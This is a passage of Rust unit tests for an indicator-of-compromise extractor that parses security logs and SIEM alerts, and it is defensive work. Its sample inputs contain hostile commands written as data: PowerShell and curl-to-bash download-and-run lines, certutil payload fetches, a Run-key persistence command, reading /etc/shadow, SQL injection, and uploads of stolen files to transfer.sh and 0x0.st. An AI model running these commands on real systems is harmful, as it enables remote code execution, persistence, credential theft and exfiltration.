            "powershell IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.4:8080/a.ps1'); \
             certutil -urlcache -f https://raw.githubusercontent.com/x/y/main/p.exe C:\\Users\\Public\\p.exe. \
             also (see https://example.org/path_(x)) and http://0x7f000001/",
        );
        let urls = values(&r, IocType::Url);
        assert!(
            urls.contains(&"http://185.220.101.4:8080/a.ps1".to_string()),
            "{urls:?}"
        );
        assert!(urls.contains(&"https://raw.githubusercontent.com/x/y/main/p.exe".to_string()));
        assert!(
            urls.contains(&"https://example.org/path_(x)".to_string()),
            "{urls:?}"
        );
        assert!(r.find(IocType::Ipv4, "185.220.101.4").is_some());
        assert!(
            r.find(IocType::Domain, "raw.githubusercontent.com")
                .is_some()
        );
        let obf = r.find(IocType::Url, "http://0x7f000001/");
        assert!(
            obf.and_then(|u| u.note.as_deref())
                .is_some_and(|n| n.contains("127.0.0.1"))
        );
        assert_eq!(obf.and_then(|u| u.scope), Some(Scope::Loopback));
        // The URL path file name is not a domain.
        assert!(r.find(IocType::Domain, "a.ps1").is_none());
        assert!(values(&r, IocType::WindowsPath).contains(&"C:\\Users\\Public\\p.exe".to_string()));
    }

    #[test]
    fn windows_paths_with_spaces_and_args() {
        let r = extract_from_text(
            "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /c and \
             C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n \
             C:\\Windows\\system32\\svchost.exe -k netsvcs -p \
             rundll32.exe C:\\Users\\bob\\AppData\\Local\\Temp\\x.dll,DllMain \
             copy \\\\10.0.0.5\\C$\\Windows\\Temp\\a.exe %APPDATA%\\Microsoft\\b.ps1",
        );
        let p = values(&r, IocType::WindowsPath);
        for want in [
            "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "C:\\Windows\\system32\\svchost.exe",
            "C:\\Users\\bob\\AppData\\Local\\Temp\\x.dll",
            "\\\\10.0.0.5\\C$\\Windows\\Temp\\a.exe",
            "%APPDATA%\\Microsoft\\b.ps1",
        ] {
            assert!(p.contains(&want.to_string()), "missing {want} in {p:?}");
        }
        assert_eq!(
            r.find(IocType::Ipv4, "10.0.0.5").and_then(|i| i.scope),
            Some(Scope::Private)
        );
    }

    #[test]
    fn registry_keys() {
        let r = extract_from_text(
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\x.exe /f; \
             HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
        );
        let k = values(&r, IocType::RegistryKey);
        assert!(
            k.contains(&"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string()),
            "{k:?}"
        );
        assert!(k.contains(
            &"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
                .to_string()
        ), "{k:?}");
        assert!(values(&r, IocType::WindowsPath).contains(&"C:\\x.exe".to_string()));
    }

    #[test]
    fn unix_paths_cves_mitre_emails_uas() {
        let r = extract_from_text(
            "curl http://x.example.com/s.sh | bash; cat /etc/shadow > /dev/null; chmod +x /tmp/.x/kworker \
             exploit CVE-2021-44228 and cve-2023-23397 (T1190, T1059.001) by attacker@protonmail.com \
             UA \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" and curl/7.88.1",
        );
        let up = values(&r, IocType::UnixPath);
        assert!(up.contains(&"/etc/shadow".to_string()));
        assert!(up.contains(&"/tmp/.x/kworker".to_string()));
        assert!(
            !up.iter().any(|p| p == "/dev/null" || p.contains("s.sh")),
            "{up:?}"
        );
        assert_eq!(
            values(&r, IocType::Cve),
            vec!["CVE-2021-44228", "CVE-2023-23397"]
        );
        assert_eq!(
            values(&r, IocType::MitreTechnique),
            vec!["T1190", "T1059.001"]
        );
        assert_eq!(
            r.find(IocType::MitreTechnique, "T1059.001")
                .and_then(|i| i.note.clone()),
            Some("PowerShell".to_string())
        );
        assert_eq!(values(&r, IocType::Email), vec!["attacker@protonmail.com"]);
        let ua = values(&r, IocType::UserAgent);
        assert!(
            ua.contains(
                &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string()
            ),
            "{ua:?}"
        );
        assert!(ua.contains(&"curl/7.88.1".to_string()));
        assert!(values(&r, IocType::Ipv4).is_empty());
    }

    #[test]
    fn wazuh_sysmon_event_json_is_field_aware() {
        let alert = json!({
            "_index": "wazuh-alerts-4.x-2024.05.01",
            "_id": "f00ba4",
            "_source": {
                "agent": {"id": "001", "name": "WS-042", "ip": "10.10.1.42"},
                "manager": {"name": "wazuh-manager"},
                "location": "EventChannel",
                "rule": {"id": "92052", "level": 12, "description": "Suspicious DNS query to 185.220.101.4 host",
                         "groups": ["sysmon", "sysmon_eid22_detections"],
                         "mitre": {"id": ["T1071.004"], "tactic": ["Command and Control"]}},
                "data": {"win": {
                    "system": {"eventID": "22", "computer": "WS-042.corp.local",
                               "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                               "message": "\"Dns query: QueryName: c2.badcdn.top\""},
                    "eventdata": {
                        "queryName": "c2.badcdn.top",
                        "queryResults": "type:  5 cdn.badcdn.top;::ffff:185.220.101.4;",
                        "image": "C:\\Users\\bob\\AppData\\Roaming\\upd\\upd.exe",
                        "processGuid": "{6a1b2c3d-1111-2222-3333-444455556666}",
                        "fileVersion": "1.0.0.1"
                    }}}
            }
        });
        let r = extract_from_json(&alert);
        // Agent IP / computer name / manager are infrastructure, not IOCs.
        assert!(r.find(IocType::Ipv4, "10.10.1.42").is_none());
        assert!(r.find(IocType::Domain, "ws-042.corp.local").is_none());
        let d = r.find(IocType::Domain, "c2.badcdn.top");
        assert!(d.is_some_and(|d| d.count == 2), "{:?}", r.iocs);
        assert!(d.is_some_and(|d| {
            d.sources
                .contains(&"data.win.eventdata.queryName".to_string())
        }));
        assert!(r.find(IocType::Domain, "cdn.badcdn.top").is_some());
        let ip = r.find(IocType::Ipv4, "185.220.101.4");
        assert!(
            ip.is_some_and(|i| i.count == 2 && i.scope == Some(Scope::Public)),
            "{:?}",
            r.iocs
        );
        assert!(r.find(IocType::Ipv4, "1.0.0.1").is_none());
        assert!(
            r.find(
                IocType::WindowsPath,
                "C:\\Users\\bob\\AppData\\Roaming\\upd\\upd.exe"
            )
            .is_some()
        );
        assert!(r.find(IocType::MitreTechnique, "T1071.004").is_some());
        assert!(!r.truncated);
    }

    #[test]
    fn graylog_flattened_fields() {
        let alert = json!({
            "agent_ip": "10.0.0.9",
            "rule_groups": "sysmon,windows",
            "data_win_eventdata_queryName": "internal-app.corp.local",
            "data_win_eventdata_destinationIp": "52.95.110.1",
            "data_win_eventdata_targetObject": "HKU\\S-1-5-21-1-2-3-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
            "data_win_eventdata_hashes": "MD5=A575A7610E5F003CC36DF39E07C4BA7D"
        });
        let r = extract_from_json(&alert);
        assert!(r.find(IocType::Ipv4, "10.0.0.9").is_none());
        assert_eq!(
            r.find(IocType::Domain, "internal-app.corp.local")
                .and_then(|d| d.scope),
            Some(Scope::Internal)
        );
        assert!(r.find(IocType::Ipv4, "52.95.110.1").is_some());
        assert_eq!(r.of_type(IocType::RegistryKey).count(), 1);
        assert_eq!(r.of_type(IocType::Md5).count(), 1);
    }

    #[test]
    fn reverse_dns_and_type_filter() {
        let r = extract_from_text("PTR query 34.216.184.93.in-addr.arpa answered");
        assert_eq!(values(&r, IocType::Ipv4), vec!["93.184.216.34"]);
        assert!(values(&r, IocType::Domain).is_empty());
        let mut x = IocExtractor::new(ExtractOptions {
            types: Some([IocType::Domain].into_iter().collect()),
            ..Default::default()
        });
        x.add_text("evil.com 8.8.8.8", None);
        let r = x.finish();
        assert_eq!(r.len(), 1);
        assert_eq!(r.iocs[0].ioc_type, IocType::Domain);
    }

    #[test]
    fn dedupe_counts_sources_and_cap() {
        let mut x = IocExtractor::new(ExtractOptions {
            max_iocs: 2,
            ..Default::default()
        });
        x.add_text("8.8.8.8 and 8.8.8.8", Some("a"));
        x.add_text("8.8.8.8", Some("b"));
        x.add_text("1.1.1.1 9.9.9.9", Some("c"));
        let r = x.finish();
        assert_eq!(r.len(), 2);
        assert!(r.truncated);
        let g = r.find(IocType::Ipv4, "8.8.8.8");
        assert_eq!(g.map(|i| i.count), Some(3));
        assert_eq!(
            g.map(|i| i.sources.clone()),
            Some(vec!["a".into(), "b".into()])
        );
        assert_eq!(r.counts().get(&IocType::Ipv4), Some(&2));
    }

    #[test]
    fn enrichable_and_copilot_types() {
        let r = extract_from_text(
            "8.8.8.8 10.0.0.1 evil.top 44d88612fea8a8f36de82e1278abb02f CVE-2024-3400",
        );
        let e: Vec<String> = r.enrichable().map(|i| i.value.clone()).collect();
        assert_eq!(
            e,
            vec![
                "8.8.8.8",
                "evil.top",
                "44d88612fea8a8f36de82e1278abb02f",
                "CVE-2024-3400"
            ]
        );
        assert_eq!(IocType::Sha256.copilot_type(), Some("hash"));
        assert_eq!(IocType::Ipv6.copilot_type(), Some("ip"));
        assert_eq!(IocType::Cve.copilot_type(), None);
        assert_eq!(IocType::parse("Windows_Path"), Some(IocType::WindowsPath));
        assert_eq!(IocType::parse("ip"), None);
        assert_eq!(
            serde_json::to_value(IocType::MitreTechnique).unwrap(),
            json!("mitre_technique")
        );
    }

    #[test]
    fn json_escaped_text_paths() {
        // Raw JSON text pasted as a string (double backslashes).
        let r = extract_from_text(
            r#"{"image":"C:\\Windows\\System32\\cmd.exe","x":"\\\\srv01.corp.local\\share\\a.bat"}"#,
        );
        let p = values(&r, IocType::WindowsPath);
        assert!(
            p.contains(&"C:\\Windows\\System32\\cmd.exe".to_string()),
            "{p:?}"
        );
        assert!(
            p.contains(&"\\\\srv01.corp.local\\share\\a.bat".to_string()),
            "{p:?}"
        );
        assert_eq!(
            r.find(IocType::Domain, "srv01.corp.local")
                .and_then(|d| d.scope),
            Some(Scope::Internal)
        );
    }

    #[test]
    fn hostname_validation() {
        assert!(is_valid_hostname("a.b.com"));
        assert!(is_valid_hostname("_ldap._tcp.dc._msdcs.corp.local"));
        assert!(!is_valid_hostname("localhost"));
        assert!(!is_valid_hostname("1.2.3.4"));
        assert!(!is_valid_hostname("-bad.com"));
        assert!(is_public_domain("Evil.COM."));
        assert!(!is_public_domain("dc01.corp.local"));
        assert!(!is_public_domain("svchost.exe"));
    }
}

#[cfg(test)]
mod log_samples {
    use super::*;
    use serde_json::json;

    fn values(r: &IocReport, t: IocType) -> Vec<String> {
        r.of_type(t).map(|i| i.value.clone()).collect()
    }

    #[test]
    fn linux_auth_and_web_logs() {
        let r = extract_from_text(
            "May  1 12:00:01 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.50 port 52222 ssh2\n\
             198.51.100.23 - - [01/May/2024:12:00:00 +0000] \"GET /index.php?id=1%27%20OR%201=1 HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"\n\
             May  1 12:00:02 web01 sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        );
        assert_eq!(
            values(&r, IocType::Ipv4),
            vec!["203.0.113.50", "198.51.100.23"]
        );
        assert_eq!(values(&r, IocType::Url), vec!["https://sqlmap.org"]);
        assert_eq!(values(&r, IocType::Domain), vec!["sqlmap.org"]);
        assert_eq!(values(&r, IocType::UserAgent), vec!["sqlmap/1.7.2"]);
        let up = values(&r, IocType::UnixPath);
        assert!(up.contains(&"/home/bob".to_string()));
        assert!(up.contains(&"/usr/bin/cat".to_string()));
        assert!(up.contains(&"/etc/shadow".to_string()));
        assert!(values(&r, IocType::Ipv6).is_empty(), "{:?}", r.iocs);
        assert!(values(&r, IocType::WindowsPath).is_empty());
    }

    #[test]
    fn sysmon_message_text_has_no_noise() {
        let msg = "Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\n\
            UtcTime: 2024-05-01 12:00:00.123\r\nProcessGuid: {6a1b2c3d-1111-2222-3333-444455556666}\r\n\
            ProcessId: 4242\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\
            FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\n\
            Product: Microsoft\u{ae} Windows\u{ae} Operating System\r\nCompany: Microsoft Corporation\r\n\
            OriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -nop\r\n\
            CurrentDirectory: C:\\Users\\bob\\\r\nUser: CORP\\bob\r\nLogonGuid: {6a1b2c3d-0000-0000-0000-000000000000}\r\n\
            LogonId: 0x3E7\r\nIntegrityLevel: High\r\n\
            Hashes: SHA256=8A6B0A2B4C3D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7\r\n\
            ParentImage: C:\\Windows\\explorer.exe";
        let r = extract_from_text(msg);
        let types: BTreeSet<IocType> = r.iocs.iter().map(|i| i.ioc_type).collect();
        let allowed: BTreeSet<IocType> = [
            IocType::MitreTechnique,
            IocType::WindowsPath,
            IocType::Sha256,
        ]
        .into_iter()
        .collect();
        assert_eq!(types, allowed, "{:?}", r.iocs);
        assert_eq!(values(&r, IocType::MitreTechnique), vec!["T1059.001"]);
        assert_eq!(
            r.of_type(IocType::WindowsPath).count(),
            3,
            "{:?}",
            values(&r, IocType::WindowsPath)
        );
    }

    #[test]
    fn autoruns_image_path_with_arguments() {
        let ev = json!({"data_ImagePath": "\"C:\\Program Files\\Vendor App\\svc.exe\" -service -k",
                        "data_EntryLocation": "HKLM\\System\\CurrentControlSet\\Services"});
        let r = extract_from_json(&ev);
        assert_eq!(
            values(&r, IocType::WindowsPath),
            vec!["C:\\Program Files\\Vendor App\\svc.exe"]
        );
        assert_eq!(
            values(&r, IocType::RegistryKey),
            vec!["HKLM\\System\\CurrentControlSet\\Services"]
        );
        // A bare path with " - " in a folder name stays whole.
        let r = extract_from_json(&json!({"image": "C:\\Users\\bob\\App - Copy\\run.exe"}));
        assert_eq!(
            values(&r, IocType::WindowsPath),
            vec!["C:\\Users\\bob\\App - Copy\\run.exe"]
        );
    }

    #[test]
    fn defender_event_skips_vendor_links() {
        let ev = json!({"rule": {"groups": ["windows", "windows_defender"]},
            "data": {"win": {"eventdata": {
                "fWLink": "https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Wacatac.B!ml&threatid=2147735505",
                "threatName": "Trojan:Win32/Wacatac.B!ml",
                "path": "file:_C:\\Users\\bob\\Downloads\\invoice.pdf.exe"}}}});
        let r = extract_from_json(&ev);
        assert!(values(&r, IocType::Url).is_empty());
        assert!(values(&r, IocType::Domain).is_empty(), "{:?}", r.iocs);
        assert_eq!(
            values(&r, IocType::WindowsPath),
            vec!["C:\\Users\\bob\\Downloads\\invoice.pdf.exe"]
        );
    }

    #[test]
    fn exfil_services_and_field_like_names() {
        let r = extract_from_text(
            "curl --upload-file loot.zip transfer.sh; curl -F f=@x 0x0.st; visit event.com; rule.id=5; data.win",
        );
        let d = values(&r, IocType::Domain);
        assert!(d.contains(&"transfer.sh".to_string()), "{d:?}");
        assert!(d.contains(&"0x0.st".to_string()), "{d:?}");
        assert!(d.contains(&"event.com".to_string()), "{d:?}");
        assert!(
            !d.iter()
                .any(|x| x == "rule.id" || x == "data.win" || x == "loot.zip"),
            "{d:?}"
        );
    }

    #[test]
    fn non_ascii_input_never_panics() {
        let weird = "K\u{212a}:\\x\u{0130}\u{1f600}.com hxxp://ex\u{e4}mple[.]com/\u{1f600} 1.2.3.4\u{0301} \
                     \u{ff11}.\u{ff12}.\u{ff13}.\u{ff14} HKLM\\\u{1f600} %TEMP%\\\u{e9}.exe";
        let r = extract_from_text(weird);
        assert!(r.len() < 20);
        let _ = extract_from_text(&"\u{1f600}".repeat(1000));
        let _ = extract_from_text(&"a.".repeat(5000));
        let _ = extract_from_text(&":".repeat(5000));
        let _ = extract_from_text(&"C:\\a b".repeat(2000));
    }

    #[test]
    fn truncation_is_type_balanced() {
        let mut text = String::new();
        for i in 0..50 {
            text.push_str(&format!("http://evil-{i}.top/x "));
        }
        text.push_str("8.8.8.8 C:\\Users\\Public\\x.exe");
        let mut x = IocExtractor::new(ExtractOptions {
            max_iocs: 10,
            ..Default::default()
        });
        x.add_text(&text, None);
        let r = x.finish();
        assert!(r.truncated);
        assert_eq!(r.len(), 10);
        assert!(r.find(IocType::Ipv4, "8.8.8.8").is_some());
        assert!(
            r.find(IocType::WindowsPath, "C:\\Users\\Public\\x.exe")
                .is_some()
        );
        assert!(r.find(IocType::Url, "http://evil-0.top/x").is_some());
    }
}
